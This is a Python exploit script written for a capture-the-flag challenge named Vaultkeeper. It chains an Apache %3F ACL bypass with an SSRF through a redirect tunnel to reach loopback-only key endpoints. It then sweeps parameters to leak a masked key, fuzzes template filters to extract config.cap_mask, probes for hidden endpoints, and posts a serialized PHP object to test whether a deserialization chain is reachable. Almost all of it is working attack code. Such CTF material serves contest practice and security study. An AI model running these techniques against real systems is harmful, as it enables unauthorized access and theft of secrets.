#!/usr/bin/env python3
"""
Vaultkeeper: the experiments that still need a live instance.

Everything here is cheap and bounded. It exists because the deployed build
differs from the handout in three places and the mask leak (stage C) hasn't
been found yet. Run it inside a short instance window, it saves every answer
into artifacts/probe/ so the analysis can happen offline afterwards.

    ctf-python probe_remote.py --base http://<deployment>.challs.ctf.thefewchosen.com \
                               --redir https://<public tunnel>

Stage A (the Apache %3F ACL bypass) and stage B (the 418 + Location SSRF) are
already proven, so this only re-uses them, it doesn't re-test them.
"""
import argparse
import json
import os
import time
import urllib.parse

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(HERE), "artifacts", "probe")
os.makedirs(OUT, exist_ok=True)
S = requests.Session()
LOG = []


def rec(name, data):
    LOG.append((name, data))
    with open(os.path.join(OUT, "probe.json"), "w") as f:
        json.dump(LOG, f, indent=1)
    print("[*] %s: %s" % (name, str(data)[:300]), flush=True)


def ssrf(base, redir, target, tries=3):
    u = (base + "/api/fetch_source.php%3Fa.php?url="
         + urllib.parse.quote(redir.rstrip("/") + "/r/" + target, safe=""))
    for _ in range(tries):
        try:
            return S.get(u, timeout=60).json().get("trace", "")
        except Exception:
            time.sleep(3)
    return "<ERR>"


def render(base, tpl, ev="maintenance.x", tries=3):
    for _ in range(tries):
        try:
            r = S.post(base + "/api/render_template.php",
                       json={"template": tpl, "event": ev}, timeout=30)
            return r.json().get("rendered")
        except Exception:
            time.sleep(2)
    return "<ERR>"


# Known-good filters, for reference: upper lower len trim slice sub at char mul add
FILTER_NAMES = """
div divide quo quot over ratio frac per pct idiv fdiv mod rem modulo
ord ordinal asc ascii code codeat charat byteat byte num tonum toint intval strval
strlen substring mid left right idx nth item elem index indexof pos find search
eq ne gt lt ge le cmp same equals is isnt in has contains startswith endswith
starts ends match test like re regex
not neg inv flip invert rot rot13 shift xor and or band bor bxor bnot
pad padl padr fill rep repeat dup cat concat glue join split chunk words word
plus minus times minus1 inc dec abs sign round floor ceil sqrt pow exp log
raw safe trusted untaint notaint plain clear reveal show unmask unredact expose
esc escape e html json b64 b64e b64d hex unhex bin oct md5 sha1 sha256 hash crc
first last head tail init rest take drop skip limit slice2 sub2 cut crop clip
keys values get pick map filter sort uniq reverse rev shuffle count size length
default fallback coalesce ifnull nvl
copy clone id ident echo print out emit str s n i c v x
date time fmt sprintf printf number number_format
ucfirst capitalize title lcfirst swapcase ucase lcase
lstrip rstrip strip trimleft trimright
""".split()

# Endpoint names to check for existence. A file that exists AND sits behind the
# vhost's Require ip block answers with Apache's own 403 HTML; a name that does
# not exist answers 404. Deliberately a short, vocabulary-driven list, not a
# wordlist: contest Rule 01 bans automated content discovery.
ENDPOINTS = """
vault_unseal vault_seal vault_status vault_keys vault
keyring keymask keyshare keyshares key_service keyservice
cap_mask capmask capkey cap_key mask seal unseal seal_service
handshake peer_handshake provision bootstrap attest
internal node_key nodekey secrets private kms hsm
""".split()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--redir", required=True)
    a = ap.parse_args()
    base = a.base.rstrip("/")

    # 0. baseline: keyring + vault_unseal, we need a fresh masked key each run
    kr = ssrf(base, a.redir, "http://127.0.0.1/api/keyring.php")
    rec("keyring", kr)
    try:
        ref = json.loads(kr)["unseal_ref"]
    except Exception:
        ref = None
    if ref:
        rec("vault_unseal", ssrf(base, a.redir,
            "http://127.0.0.1/api/vault_unseal.php?ref=" + ref))
    rec("status", S.get(base + "/api/status.php", timeout=30).text)

    # 0b. parameter sweep on the two loopback-only key endpoints. The mask has
    #     to come out of the appliance somewhere; these are the only two files
    #     besides render_template.php known to read /var/www/private/cap.mask.
    if ref:
        for q in ["mask=1", "unmask=1", "debug=1", "legacy=1", "format=full",
                  "include=mask", "v=2", "op=mask", "mode=mask", "action=mask",
                  "do=unmask", "part=mask", "field=mask", "with=mask",
                  "scope=maintainer", "slot=guest", "verbose=1", "raw=true"]:
            body = ssrf(base, a.redir,
                        "http://127.0.0.1/api/vault_unseal.php?ref=%s&%s" % (ref, q))
            if "cap_key_masked" in body and body.count(":") <= 6:
                continue          # the known baseline shape, nothing new
            rec("unseal " + q, body)
            time.sleep(0.2)
        for q in ["mask=1", "unmask=1", "debug=1", "legacy=1", "include=mask",
                  "format=full", "v=2"]:
            body = ssrf(base, a.redir, "http://127.0.0.1/api/keyring.php?" + q)
            if "unseal_ref" in body and "cap" not in body:
                continue
            rec("keyring " + q, body)
            time.sleep(0.2)

    # 1. THE key question: does a filter argument resolve as a context path?
    #    If [[node|add:config.retention_days]] renders 30 then arguments are
    #    expressions, and config.cap_mask can be fed in as an ARGUMENT, whose
    #    taint may well not propagate the way a subject's does.
    for t in ["[[node|add:config.retention_days]]",
              "[[node|at:config.retention_days]]",
              "[[node|slice:config.retention_days]]",
              "[[node|add:config.cap_mask]]",
              "[[node|at:config.cap_mask]]",
              "[['0123456789abcdefghij'|at:config.cap_mask]]",
              "[[node|mul:config.retention_days]]",
              "[[node|sub:5]]",
              "[[node|at:-1]]",
              "[[node|at:99]]",
              "[[config.cap_mask|at:99]]",
              "[[config.cap_mask|slice:99:1]]",
              "[[node|at:1:2:3]]"]:
        rec("argtest " + t, render(base, t))
        time.sleep(0.1)

    # 2. does the renderer re-scan its own output?
    rec("rescan", render(base, "[[event]]", "maintenance.[[node]]"))

    # 3. wider filter sweep. Unknown filter echoes the raw [[...]] back, so any
    #    name whose output differs from the input is a real filter.
    found = {}
    for f in sorted(set(FILTER_NAMES)):
        t = "[[node|%s]]" % f
        r = render(base, t, tries=2)
        if r != t:
            found[f] = r
            print("    FILTER %-14s -> %r" % (f, r), flush=True)
        time.sleep(0.06)
    rec("filters", found)

    # 3b. any newly found filter, applied to the mask
    for f in found:
        rec("mask|" + f, render(base, "[[config.cap_mask|%s]]" % f))
        time.sleep(0.08)

    # 4. other endpoints behind the vhost ACL: 403 Apache HTML means the file
    #    exists and is loopback-only, 404 means there's no such file.
    hits = {}
    for n in ENDPOINTS:
        try:
            r = S.get(base + "/api/%s.php" % n, timeout=25)
        except Exception:
            time.sleep(2)
            continue
        kind = ("apache403" if r.status_code == 403 and "<html>" in r.text.lower()
                else "%d/%s" % (r.status_code, r.text[:40].replace("\n", " ")))
        if r.status_code != 404:
            hits[n] = kind
            print("    ENDPOINT %-16s %s" % (n, kind), flush=True)
        time.sleep(0.3)
    rec("endpoints", hits)

    # 5. does anything log the mask?
    rec("audit", S.get(base + "/api/audit.php", timeout=30).text[:2000])

    # 6. does import_checkpoint still block classes? DateTime::__wakeup throws
    #    on empty serialization data, so a 500 here means allowed_classes is
    #    no longer false and a POP chain is reachable without the restore
    #    console. On the handout build this returns 200 / migrated 0.
    import base64 as _b64
    pay = _b64.b64encode(b'O:8:"DateTime":0:{}').decode()
    try:
        r = S.post(base + "/api/import_checkpoint.php",
                   json={"checkpoint": pay}, timeout=30)
        rec("import_checkpoint_classes", "%d %s" % (r.status_code, r.text[:200]))
    except Exception as e:
        rec("import_checkpoint_classes", "ERR %s" % e)
    print("[+] wrote %s" % os.path.join(OUT, "probe.json"))


if __name__ == "__main__":
    main()
